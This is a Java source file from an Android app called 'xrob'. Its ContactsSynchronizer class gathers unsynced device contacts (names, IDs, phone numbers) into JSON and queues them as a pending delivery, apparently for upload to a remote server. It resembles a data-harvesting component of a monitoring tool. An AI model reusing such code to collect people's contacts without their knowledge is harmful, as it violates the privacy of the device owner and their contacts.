package com.theah64.xrob.asynctasks;

import android.content.Context;
import android.util.Log;

import com.theah64.xrob.database.Contacts;
import com.theah64.xrob.database.PendingDeliveries;
import com.theah64.xrob.database.PhoneNumbers;
import com.theah64.xrob.models.Contact;
import com.theah64.xrob.models.PendingDelivery;
import com.theah64.xrob.utils.APIRequestBuilder;
import com.theah64.xrob.utils.APIResponse;
import com.theah64.xrob.utils.OkHttpUtils;
import com.theah64.xrob.utils.Xrob;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.util.List;
import java.util.Locale;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Request;
import okhttp3.Response;

/**
 * Created by theapache64 on 12/9/16.
 */
public class ContactsSynchronizer extends BaseJSONPostNetworkAsyncTask<Void> {

    private static final String X = ContactsSynchronizer.class.getSimpleName();

    public ContactsSynchronizer(Context context, String apiKey) {
        super(context, apiKey);
        Log.d(X, "Started ContactsSynchronizer");
    }


    @Override
    protected Void doInBackground(String... string) {
        push(getContext(), getApiKey());
        return null;
    }

    private static synchronized void push(final Context context, final String apiKey) {
        final Contacts contactsTable = Contacts.getInstance(context);
        final List<Contact> unSyncedContacts = contactsTable.getNonSyncedContacts();

        if (unSyncedContacts != null) {

            final JSONArray jaContacts = new JSONArray();

            Log.d(X, unSyncedContacts.size() + " need to be synced!");

            try {

                //Looping through each contact
                for (final Contact contact : unSyncedContacts) {

                    final JSONObject joContact = new JSONObject();
                    joContact.put(Contacts.COLUMN_NAME, contact.getName());
                    joContact.put(Contacts.COLUMN_ANDROID_CONTACT_ID, contact.getAndroidContactId());

                    if (contact.getPhoneNumbers() != null) {

                        final JSONArray jaPhoneNumbers = new JSONArray();

                        for (final Contact.PhoneNumber phoneNumber : contact.getPhoneNumbers()) {

                            final JSONObject joPhoneNumber = new JSONObject();

                            joPhoneNumber.put(PhoneNumbers.COLUMN_PHONE_NUMBER, phoneNumber.getPhone());
                            joPhoneNumber.put(PhoneNumbers.COLUMN_PHONE_TYPE, phoneNumber.getPhoneType());

                            jaPhoneNumbers.put(joPhoneNumber);
                        }


                        joContact.put("phone_numbers", jaPhoneNumbers);
                    }

                    jaContacts.put(joContact);
                }


                final PendingDelivery pd = new PendingDelivery(
                        null,
                        false,
                        Xrob.DATA_TYPE_FILES,
                        String.format(Locale.getDefault(), "%d contact(s) retrieved", jaContacts.length()),
                        jaContacts.toString()
                );

                PendingDeliveries.getInstance(context).add(pd);


            } catch (JSONException e) {
                e.printStackTrace();
            }
        } else {
            Log.i(X, "Every contacts are synced :)");
        }
    }

}
